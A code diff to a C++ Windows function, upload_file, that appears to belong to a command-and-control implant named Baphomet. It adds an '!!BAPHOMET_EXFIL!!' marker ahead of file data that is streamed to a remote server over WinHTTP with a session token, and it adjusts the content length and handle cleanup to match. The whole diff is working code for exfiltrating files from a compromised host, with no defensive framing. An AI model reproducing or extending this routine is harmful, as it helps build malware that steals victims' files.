@@ -8,26 +8,28 @@ bool
 networking::upload_file(
 		_In_ const HINTERNET hConnect,
 		_In_ const std::string& object_guid,
-		_In_ const HANDLE hFile,
+		_In_ HANDLE hFile,
 		_In_ const std::string& session_token,
 		_In_ const bool is_https
 	) {
 
-	HINTERNET hRequest = nullptr;
-	LARGE_INTEGER li = { 0 };
+	HINTERNET hRequest	= nullptr;
+	LARGE_INTEGER li	= { 0 };
 
-	void* file_buffer = nullptr;
-	wchar_t raw_path[MAX_PATH + 1] = { 0 };
+	void*	file_buffer				= nullptr;
+	wchar_t raw_path[MAX_PATH + 1]	= { 0 };
+	char	file_prefix[19]			= "!!BAPHOMET_EXFIL!!";
 
-	DWORD file_size = 0;
-	DWORD bytes_read = 0;
-	DWORD total_bytes_read = 0;
+	DWORD file_size			= 0;
+	DWORD bytes_read		= 0;
+	DWORD total_bytes_read	= 0;
 
 	std::wstring auth_hdr;
 	std::wstring file_extension;
 
 
 	auto _ = defer([&]() {
+		CLOSE_HANDLE(hFile);
 		if (hRequest != nullptr) {
 			WinHttpCloseHandle(hRequest);
 		}
@@ -136,12 +138,26 @@ networking::upload_file(
 		0,
 		WINHTTP_NO_REQUEST_DATA,
 		0,
-		file_size,
+		file_size + (sizeof(file_prefix) - 1),
 		0
 	)) {
 		return false;
 	}
 
+
+	//
+	// write file prefix to indicate it's a response,
+	// then the entire file, 1 page at a time incase the file is large.
+	//
+
+	if(!WinHttpWriteData(
+		hRequest,
+		file_prefix,
+		sizeof(file_prefix) - 1,
+		nullptr
+	)) {
+		return false;
+	}
 
 	while (ReadFile(
 			hFile,
